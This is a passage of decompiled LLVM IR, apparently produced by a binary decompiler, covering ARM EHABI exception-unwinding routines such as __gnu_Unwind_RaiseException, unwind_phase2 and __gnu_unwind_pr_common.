  uselistorder i32* @r3, { 179, 180, 184, 6, 181, 182, 185, 58, 27, 59, 60, 28, 37, 38, 29, 30, 31, 32, 15, 33, 34, 35, 36, 16, 155, 162, 10, 20, 21, 9, 161, 19, 160, 23, 22, 4, 64, 65, 66, 67, 68, 69, 70, 71, 61, 62, 63, 11, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 166, 167, 163, 157, 39, 40, 41, 42, 43, 44, 24, 170, 169, 82, 83, 84, 7, 8, 85, 183, 45, 86, 87, 88, 89, 90, 91, 92, 93, 94, 217, 164, 168, 156, 56, 95, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 96, 186, 187, 188, 189, 190, 191, 13, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 3, 209, 210, 211, 12, 212, 213, 214, 215, 216, 97, 98, 99, 14, 100, 101, 0, 1, 102, 103, 2, 104, 107, 106, 105, 165, 158, 159, 108, 109, 171, 172, 5, 173, 175, 174, 53, 110, 176, 111, 112, 117, 113, 114, 118, 119, 120, 121, 122, 123, 115, 116, 125, 126, 127, 128, 130, 25, 26, 129, 131, 132, 133, 134, 124, 54, 146, 135, 18, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 147, 148, 149, 150, 153, 154, 151, 152, 17, 46, 47, 48, 49, 50, 51, 52, 55, 57, 177, 178 }
  uselistorder i32 25, { 1, 0, 2 }
  uselistorder i32 26, { 6, 0, 1, 2, 7, 8, 3, 4, 5 }
  uselistorder i32 10, { 16, 19, 87, 11, 20, 7, 12, 54, 30, 8, 13, 33, 55, 21, 22, 9, 40, 56, 23, 10, 34, 57, 41, 88, 24, 90, 0, 89, 31, 43, 39, 59, 42, 58, 35, 14, 1, 60, 3, 61, 2, 4, 44, 62, 63, 64, 17, 15, 45, 65, 25, 66, 5, 18, 68, 67, 36, 32, 69, 70, 71, 72, 73, 46, 26, 74, 47, 75, 48, 76, 37, 27, 77, 78, 79, 80, 81, 82, 83, 28, 49, 29, 50, 84, 85, 51, 86, 6, 38, 52, 53 }
  uselistorder i32 %ucbp, { 1, 0, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_18040, { 1, 0 }
  uselistorder label %dec_label_pc_17fe4, { 1, 0 }
  uselistorder label %dec_label_pc_17fe0, { 1, 0 }
  uselistorder label %dec_label_pc_17f90, { 1, 0 }
  uselistorder label %dec_label_pc_17f7c, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_18054 = add i32 %ucbp, 12
  %v3_18054 = inttoptr i32 %v2_18054 to i32*
  store i32 %stop_fn, i32* %v3_18054, align 4
  %v3_18058 = add i32 %ucbp, 24
  %v4_18058 = inttoptr i32 %v3_18058 to i32*
  store i32 %tmp, i32* %v4_18058, align 4
  %v1_1805c = add i32 %entry_vrs, 60
  %v2_1805c = inttoptr i32 %v1_1805c to i32*
  %v3_1805c = load i32, i32* %v2_1805c, align 4
  %v2_18064 = add i32 %entry_vrs, 64
  %v3_18064 = inttoptr i32 %v2_18064 to i32*
  store i32 %v3_1805c, i32* %v3_18064, align 4
  %v3_1806c = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_1806c

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_180846 = add i32 %vrs, 64
  %v2_180847 = inttoptr i32 %v1_180846 to i32*
  %v3_180848 = load i32, i32* %v2_180847, align 4
  %v2_180889 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_180848)
  store i32 %v2_180889, i32* %r0.global-to-local, align 4
  %v2_1808c11 = icmp eq i32 %v2_180889, 0
  br i1 %v2_1808c11, label %dec_label_pc_18094, label %dec_label_pc_180c4

dec_label_pc_18094:                               ; preds = %entry, %dec_label_pc_18094.dec_label_pc_18080_crit_edge
  %v0_18094 = load i32, i32* @r5, align 4
  %v1_18094 = add i32 %v0_18094, 64
  %v2_18094 = inttoptr i32 %v1_18094 to i32*
  %v3_18094 = load i32, i32* %v2_18094, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1809c = load i32, i32* @r4, align 4
  %v2_1809c = add i32 %v1_1809c, 20
  %v3_1809c = inttoptr i32 %v2_1809c to i32*
  store i32 %v3_18094, i32* %v3_1809c, align 4
  %v0_180a0 = load i32, i32* @r4, align 4
  %v1_180a8 = add i32 %v0_180a0, 16
  %v2_180a8 = inttoptr i32 %v1_180a8 to i32*
  %v3_180a8 = load i32, i32* %v2_180a8, align 4
  call void @__pseudo_branch(i32 %v3_180a8)
  %v0_180b4 = load i32, i32* %r0.global-to-local, align 4
  %v7_180b4 = icmp eq i32 %v0_180b4, 8
  br i1 %v7_180b4, label %dec_label_pc_18094.dec_label_pc_18080_crit_edge, label %dec_label_pc_180bc

dec_label_pc_18094.dec_label_pc_18080_crit_edge:  ; preds = %dec_label_pc_18094
  %v0_18080.pre = load i32, i32* @r4, align 4
  %v0_18084.pre = load i32, i32* @r5, align 4
  store i32 %v0_18080.pre, i32* %r0.global-to-local, align 4
  %v1_18084 = add i32 %v0_18084.pre, 64
  %v2_18084 = inttoptr i32 %v1_18084 to i32*
  %v3_18084 = load i32, i32* %v2_18084, align 4
  %v2_18088 = call i32 @get_eit_entry(i32 %v0_18080.pre, i32 %v3_18084)
  store i32 %v2_18088, i32* %r0.global-to-local, align 4
  %v2_1808c = icmp eq i32 %v2_18088, 0
  br i1 %v2_1808c, label %dec_label_pc_18094, label %dec_label_pc_180c4

dec_label_pc_180bc:                               ; preds = %dec_label_pc_18094
  %v7_180bc = icmp eq i32 %v0_180b4, 7
  br i1 %v7_180bc, label %dec_label_pc_180c8, label %dec_label_pc_180c4

dec_label_pc_180c4:                               ; preds = %entry, %dec_label_pc_18094.dec_label_pc_18080_crit_edge, %dec_label_pc_180bc
  %v0_180c4 = call i32 @abort()
  store i32 %v0_180c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_180c8

dec_label_pc_180c8:                               ; preds = %dec_label_pc_180bc, %dec_label_pc_180c4
  %v0_180c8 = load i32, i32* @r5, align 4
  %v1_180c8 = add i32 %v0_180c8, 4
  store i32 %v1_180c8, i32* %r0.global-to-local, align 4
  %v1_180cc = inttoptr i32 %v1_180c8 to i32*
  %v2_180cc = call i32 @__restore_core_regs(i32* %v1_180cc)
  store i32 %v2_180cc, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_180c8, { 1, 0 }
  uselistorder label %dec_label_pc_180c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18094, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_180d0 = add i32 %ucbp, 20
  %v2_180d0 = inttoptr i32 %v1_180d0 to i32*
  %v3_180d0 = load i32, i32* %v2_180d0, align 4
  %v1_180d8 = load i32, i32* %r1.global-to-local, align 4
  %v2_180d8 = add i32 %v1_180d8, 64
  %v3_180d8 = inttoptr i32 %v2_180d8 to i32*
  store i32 %v3_180d0, i32* %v3_180d8, align 4
  %v1_180dc = add i32 %ucbp, 12
  %v2_180dc = inttoptr i32 %v1_180dc to i32*
  %v3_180dc = load i32, i32* %v2_180dc, align 4
  %v2_180e0 = icmp eq i32 %v3_180dc, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_180ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_180ec, i32* @r5, align 4
  br i1 %v2_180e0, label %dec_label_pc_180f4, label %dec_label_pc_18130

dec_label_pc_180f4:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_18100 = add i32 %ucbp, 16
  %v2_18100 = inttoptr i32 %v1_18100 to i32*
  %v3_18100 = load i32, i32* %v2_18100, align 4
  call void @__pseudo_branch(i32 %v3_18100)
  br i1 false, label %dec_label_pc_18128, label %dec_label_pc_18114

dec_label_pc_18114:                               ; preds = %dec_label_pc_180f4
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_19148.760 to i32))
  %v0_1811c = load i32, i32* @r4, align 4
  %v0_18120 = load i32, i32* @r5, align 4
  store i32 %v0_18120, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_1811c, i32 %v0_18120)
  br label %dec_label_pc_18128

dec_label_pc_18128:                               ; preds = %dec_label_pc_180f4, %dec_label_pc_18114
  %v0_18128 = load i32, i32* @r5, align 4
  %v1_18128 = add i32 %v0_18128, 4
  %v1_1812c = inttoptr i32 %v1_18128 to i32*
  %v2_1812c = call i32 @__restore_core_regs(i32* %v1_1812c)
  %v1_18134.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_18130

dec_label_pc_18130:                               ; preds = %entry, %dec_label_pc_18128
  %v1_18134 = phi i32 [ %v0_180ec, %entry ], [ %v1_18134.pre, %dec_label_pc_18128 ]
  %v3_18134 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_18134, i32 1)
  %v0_18138 = call i32 @abort()
  ret i32 %v0_18138

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 3, 2, 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 72, 73, 74, 75, 3, 4, 5, 52, 6, 7, 8, 35, 9, 10, 11, 12, 13, 14, 15, 16, 17, 36, 37, 38, 39, 20, 18, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 76, 34, 64, 66, 65, 53, 40, 41, 42, 67, 68, 46, 47, 69, 54, 55, 56, 43, 48, 57, 58, 49, 44, 45, 50, 51, 70, 71, 59, 60, 61, 62, 63, 0, 1, 2 }
  uselistorder i1 true, { 0, 4, 9, 10, 5, 6, 17, 18, 13, 14, 15, 7, 8, 16, 19, 20, 21, 22, 11, 12, 27, 28, 35, 36, 31, 32, 33, 23, 24, 34, 37, 38, 39, 25, 26, 29, 30, 40, 41, 42, 43, 44, 45, 1, 153, 2, 145, 46, 47, 48, 49, 50, 51, 137, 138, 146, 147, 139, 52, 53, 54, 140, 141, 142, 148, 55, 56, 57, 58, 135, 136, 59, 60, 143, 61, 152, 62, 63, 64, 65, 3, 144, 66, 67, 68, 69, 70, 71, 72, 73, 75, 74, 76, 77, 78, 79, 80, 81, 82, 83, 87, 84, 85, 88, 86, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 154, 101, 99, 100, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 149, 151, 150, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_18130, { 1, 0 }
  uselistorder label %dec_label_pc_18128, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1813c = load i32, i32* @r4, align 4
  store i32 %v3_1813c, i32* %stack_var_-16, align 4
  %v6_1813c = load i32, i32* @r5, align 4
  %v9_1813c = load i32, i32* @r6, align 4
  %v12_1813c = load i32, i32* @lr, align 4
  %v1_18140 = add i32 %entry_vrs, 60
  %v2_18140 = inttoptr i32 %v1_18140 to i32*
  %v3_18140 = load i32, i32* %v2_18140, align 4
  %v2_18144 = add i32 %entry_vrs, 64
  %v3_18144 = inttoptr i32 %v2_18144 to i32*
  store i32 %v3_18140, i32* %v3_18144, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_18174 = load i32, i32* %v3_18144, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_1818c = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_18174)
  %v2_18190 = icmp eq i32 %v2_1818c, 0
  br i1 %v2_18190, label %dec_label_pc_18198, label %dec_label_pc_181cc

dec_label_pc_18198:                               ; preds = %entry
  %v0_18198 = load i32, i32* @r5, align 4
  %v1_181a0 = add i32 %v0_18198, 16
  %v2_181a0 = inttoptr i32 %v1_181a0 to i32*
  %v3_181a0 = load i32, i32* %v2_181a0, align 4
  call void @__pseudo_branch(i32 %v3_181a0)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_181b8 = load i32, i32* %saved_vrs_-320, align 4
  %v1_181bc = urem i32 %v2_181b8, 2
  %v2_181bc = icmp eq i32 %v1_181bc, 0
  br i1 %v2_181bc, label %dec_label_pc_181dc, label %dec_label_pc_181c4

dec_label_pc_181c4:                               ; preds = %dec_label_pc_18198, %dec_label_pc_181dc
  %v0_181c4 = phi i1 [ false, %dec_label_pc_18198 ], [ %phitmp, %dec_label_pc_181dc ]
  br i1 %v0_181c4, label %dec_label_pc_181e8, label %dec_label_pc_181cc

dec_label_pc_181cc:                               ; preds = %entry, %dec_label_pc_181c4
  %v2_181d4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_181d4, i32* @r4, align 4
  store i32 %v6_1813c, i32* @r5, align 4
  store i32 %v9_1813c, i32* @r6, align 4
  store i32 %v12_1813c, i32* @lr, align 4
  ret i32 9

dec_label_pc_181dc:                               ; preds = %dec_label_pc_18198
  %v2_181dc = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_181dc, i32* @r0, align 4
  %v1_181e0 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_181dc)
  %v0_181c4.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_181c4.pre, 6
  br label %dec_label_pc_181c4

dec_label_pc_181e8:                               ; preds = %dec_label_pc_181c4
  %v0_181e8 = load i32, i32* @r5, align 4
  %v0_181ec = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_181e8, i32 %v0_181ec)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_181cc, { 1, 0 }
  uselistorder label %dec_label_pc_181c4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_181f4 = add i32 %ucbp, 12
  %v2_181f4 = inttoptr i32 %v1_181f4 to i32*
  %v3_181f4 = load i32, i32* %v2_181f4, align 4
  %v2_181f8 = icmp eq i32 %v3_181f4, 0
  br i1 %v2_181f8, label %dec_label_pc_18200, label %dec_label_pc_18204

dec_label_pc_18200:                               ; preds = %entry
  %v2_18200 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_18204

dec_label_pc_18204:                               ; preds = %entry, %dec_label_pc_18200
  %v1_18204 = add i32 %entry_vrs, 60
  %v2_18204 = inttoptr i32 %v1_18204 to i32*
  %v3_18204 = load i32, i32* %v2_18204, align 4
  %v2_1820c = add i32 %entry_vrs, 64
  %v3_1820c = inttoptr i32 %v2_1820c to i32*
  store i32 %v3_18204, i32* %v3_1820c, align 4
  %v3_18210 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_18210

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_18204, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_18270

bb:                                               ; preds = %entry
  %v7_18228 = mul i32 %regclass, 4
  %v8_18228 = add i32 %v7_18228, ptrtoint (i32* @global_var_18230.762 to i32)
  call void @__pseudo_branch(i32 %v8_18228)
  br label %dec_label_pc_18270

dec_label_pc_18270:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_6, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_18358 = load i32, i32* @r4, align 4
  %v6_18358 = load i32, i32* @r5, align 4
  %v2_18368 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_18370 = add i32 %ucbp, 76
  %v2_18370 = inttoptr i32 %v1_18370 to i32*
  %v3_18370 = load i32, i32* %v2_18370, align 4
  %v1_1837c = inttoptr i32 %v3_18370 to i32*
  %v2_1837c = load i32, i32* %v1_1837c, align 4
  store i32 %v2_1837c, i32* @lr, align 4
  %v4_1837c = add i32 %v3_18370, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_18388 = urem i32 %state, 4
  store i32 %v1_18388, i32* %r2.global-to-local, align 4
  %v1_1838c = and i32 %state, 8
  store i32 %v1_1838c, i32* %r0.global-to-local, align 4
  %v4_1839c = getelementptr inbounds %anon_struct_6, %anon_struct_6* %uws_-60, i32 0, i32 0
  store i32 %v2_1837c, i32* %v4_1839c, align 8
  br i1 %v2_18368, label %dec_label_pc_183ac, label %dec_label_pc_18688

dec_label_pc_183ac:                               ; preds = %entry
  %v3_183ac = mul i32 %v2_1837c, 256
  store i32 %v3_183ac, i32* %v4_1839c, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_183c4

dec_label_pc_183c4:                               ; preds = %dec_label_pc_18688, %dec_label_pc_183ac
  %v0_183e8647090 = phi i32 [ %v2_186a0, %dec_label_pc_18688 ], [ %v4_1837c, %dec_label_pc_183ac ]
  store i32 %v1_18388, i32* %r2.global-to-local, align 4
  %v1_183c8 = add i32 %ucbp, 80
  %v2_183c8 = inttoptr i32 %v1_183c8 to i32*
  %v3_183c8 = load i32, i32* %v2_183c8, align 4
  %v7_183cc = icmp eq i32 %v1_18388, 2
  br i1 %v7_183cc, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_183c4
  %v2_183d0 = add i32 %ucbp, 56
  %v3_183d0 = inttoptr i32 %v2_183d0 to i32*
  %v4_183d0 = load i32, i32* %v3_183d0, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_183c4, %bb
  %v0_183e86470 = phi i32 [ %v0_183e8647090, %dec_label_pc_183c4 ], [ %v4_183d0, %bb ]
  %v1_183d4 = urem i32 %v3_183c8, 2
  %v2_183d4 = icmp eq i32 %v1_183d4, 0
  br i1 %v2_183d4, label %dec_label_pc_183e8.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_184a8

dec_label_pc_183e8.preheader:                     ; preds = %bb148
  %v1_183e86571 = inttoptr i32 %v0_183e86470 to i32*
  %v2_183e86672 = load i32, i32* %v1_183e86571, align 4
  %v2_183ec6874 = icmp eq i32 %v2_183e86672, 0
  br i1 %v2_183ec6874, label %dec_label_pc_184a8, label %dec_label_pc_183f4.preheader.lr.ph.lr.ph

dec_label_pc_183f4.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_183e8.preheader
  %v7_183f8 = icmp eq i32 %id, 2
  %v2_18484 = icmp eq i32 %v1_18388, 0
  %v2_18650 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_1856c = icmp eq i32 %v1_1838c, 0
  br label %dec_label_pc_183f4.preheader.lr.ph

dec_label_pc_183f4.preheader.lr.ph:               ; preds = %dec_label_pc_183f4.preheader.lr.ph.lr.ph, %dec_label_pc_186bc
  %v1_1840496 = phi i32 [ %v2_183e86672, %dec_label_pc_183f4.preheader.lr.ph.lr.ph ], [ %v2_183e866, %dec_label_pc_186bc ]
  %v1_1840093 = phi i32 [ %v0_183e86470, %dec_label_pc_183f4.preheader.lr.ph.lr.ph ], [ %v2_186c0, %dec_label_pc_186bc ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_183f4.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_186bc ]
  br label %dec_label_pc_183f4.preheader

dec_label_pc_183f4.preheader:                     ; preds = %dec_label_pc_183f4.preheader.lr.ph, %dec_label_pc_18680
  %v1_1840495 = phi i32 [ %v1_1840496, %dec_label_pc_183f4.preheader.lr.ph ], [ %v2_183e8, %dec_label_pc_18680 ]
  %v1_1840092 = phi i32 [ %v1_1840093, %dec_label_pc_183f4.preheader.lr.ph ], [ %v1_18680, %dec_label_pc_18680 ]
  br label %dec_label_pc_183f4

dec_label_pc_183f4:                               ; preds = %dec_label_pc_183f4.preheader, %dec_label_pc_18498
  %v1_18404 = phi i32 [ %v1_1840495, %dec_label_pc_183f4.preheader ], [ %v2_1849c, %dec_label_pc_18498 ]
  %v1_18418 = phi i32 [ %v1_1840092, %dec_label_pc_183f4.preheader ], [ %v1_18498, %dec_label_pc_18498 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_183f8, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_183f4
  %v2_183fc = add i32 %v1_18418, 4
  %v3_183fc = inttoptr i32 %v2_183fc to i32*
  %v4_183fc = load i32, i32* %v3_183fc, align 4
  store i32 %v4_183fc, i32* @r5, align 4
  store i32 %v1_18404, i32* @r6, align 4
  %v0_18408109 = load i32, i32* @r8, align 4
  %v1_18408110 = add i32 %v0_18408109, 72
  %v2_18408111 = inttoptr i32 %v1_18408110 to i32*
  %v3_18408112 = load i32, i32* %v2_18408111, align 4
  store i32 %v3_18408112, i32* @lr, align 4
  %v2_18414 = add i32 %v1_18418, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_183f4
  %v2_18400 = add i32 %v1_18418, 2
  %v3_18400 = inttoptr i32 %v2_18400 to i16*
  %v4_18400 = load i16, i16* %v3_18400, align 2
  %v5_18400 = zext i16 %v4_18400 to i32
  store i32 %v5_18400, i32* @r5, align 4
  %v0_18408 = load i32, i32* @r8, align 4
  %v1_18408 = add i32 %v0_18408, 72
  %v2_18408 = inttoptr i32 %v1_18408 to i32*
  %v3_18408 = load i32, i32* %v2_18408, align 4
  store i32 %v3_18408, i32* @lr, align 4
  %v2_18410 = inttoptr i32 %v1_18418 to i16*
  %v3_18410 = load i16, i16* %v2_18410, align 2
  %v4_18410 = zext i16 %v3_18410 to i32
  store i32 %v4_18410, i32* @r6, align 4
  %v2_18418 = add i32 %v1_18418, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_18418, %.thread16 ], [ %v2_18414, %bb151 ]
  %v3_18408115 = phi i32 [ %v3_18408, %.thread16 ], [ %v3_18408112, %bb151 ]
  %v0_18420113 = phi i32 [ %v5_18400, %.thread16 ], [ %v4_183fc, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_18420 = and i32 %v0_18420113, -2
  %v2_18424 = add i32 %v1_18420, %v3_18408115
  store i32 %v2_18424, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18434 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18434, i32* %r0.global-to-local, align 4
  %v5_18440 = call i32 @_Unwind_VRS_Get(i32 %v0_18434, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18440, i32* %r0.global-to-local, align 4
  %v3_18444 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_18444, i32* %r2.global-to-local, align 4
  %v0_18448 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_18448, %v3_18444
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_18454

._crit_edge:                                      ; preds = %bb152
  %v0_1846c.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_18454:                               ; preds = %bb152
  %v0_18454 = load i32, i32* @r6, align 4
  %v1_18454 = and i32 %v0_18454, -2
  %v2_18458 = add i32 %v1_18454, %v0_18448
  %v3_1845c = icmp ult i32 %v3_18444, %v2_18458
  br i1 %v3_1845c, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_18454
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_18454
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_1846c = phi i32 [ %v0_1846c.pre, %._crit_edge ], [ %v0_18454, %bb153 ], [ %v0_18454, %.thread20 ]
  %v0_18614 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_18468 = load i32, i32* @r5, align 4
  %v1_1846c = urem i32 %v0_1846c, 2
  %v1_18468 = mul i32 %v0_18468, 2
  %v3_18470 = and i32 %v1_18468, 2
  %v4_18470 = or i32 %v3_18470, %v1_1846c
  store i32 %v4_18470, i32* %r2.global-to-local, align 4
  %v7_18474 = icmp eq i32 %v4_18470, 1
  br i1 %v7_18474, label %dec_label_pc_18608, label %dec_label_pc_1847c

dec_label_pc_1847c:                               ; preds = %bb154
  %v2_18474 = icmp eq i32 %v4_18470, 0
  br i1 %v2_18474, label %dec_label_pc_18480, label %dec_label_pc_18530

dec_label_pc_18480:                               ; preds = %dec_label_pc_1847c
  store i32 %v1_18388, i32* %r2.global-to-local, align 4
  br i1 %v2_18484, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_18480
  %v0_18498119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_18498

bb155:                                            ; preds = %dec_label_pc_18480
  %v2_18490 = icmp eq i32 %v0_18614, 0
  %v0_18498 = load i32, i32* @r7, align 4
  br i1 %v2_18490, label %dec_label_pc_18498, label %dec_label_pc_18810

dec_label_pc_18498:                               ; preds = %.thread, %bb155
  %v0_18498120 = phi i32 [ %v0_18498119, %.thread ], [ %v0_18498, %bb155 ]
  %v1_18498 = add i32 %v0_18498120, 4
  %v1_1849c = inttoptr i32 %v1_18498 to i32*
  %v2_1849c = load i32, i32* %v1_1849c, align 4
  %v2_184a0 = icmp eq i32 %v2_1849c, 0
  br i1 %v2_184a0, label %dec_label_pc_184a8, label %dec_label_pc_183f4

dec_label_pc_184a8:                               ; preds = %dec_label_pc_186bc, %dec_label_pc_18680, %dec_label_pc_18498, %dec_label_pc_183e8.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_183e8.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18498 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18680 ], [ %stack_var_-76.4, %dec_label_pc_186bc ]
  %v0_184a8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_184a8, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_6* %uws_-60 to %anon_struct_15*
  %v4_184b0 = call i32 @__gnu_unwind_execute(i32 %v0_184a8, %anon_struct_15* %tmp156)
  store i32 %v4_184b0, i32* %r0.global-to-local, align 4
  store i32 %v4_184b0, i32* %r5.global-to-local, align 4
  %v2_184b4 = icmp eq i32 %v4_184b0, 0
  br i1 %v2_184b4, label %dec_label_pc_184bc, label %dec_label_pc_18538

dec_label_pc_184bc:                               ; preds = %dec_label_pc_184a8
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_184c0 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_184c0, label %bb157, label %dec_label_pc_184cc

bb157:                                            ; preds = %dec_label_pc_184bc
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1853c

dec_label_pc_184cc:                               ; preds = %dec_label_pc_184bc
  %v2_184cc = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_184cc, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_184dc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_184dc, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_184e4 = call i32 @_Unwind_VRS_Get(i32 %v0_184dc, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_184e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_184dc, i32* %r0.global-to-local, align 4
  %v5_184fc = call i32 @_Unwind_VRS_Set(i32 %v0_184dc, i32 %v0_184e8, i32 14, i32 %v0_184e8, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_184fc, i32* %r0.global-to-local, align 4
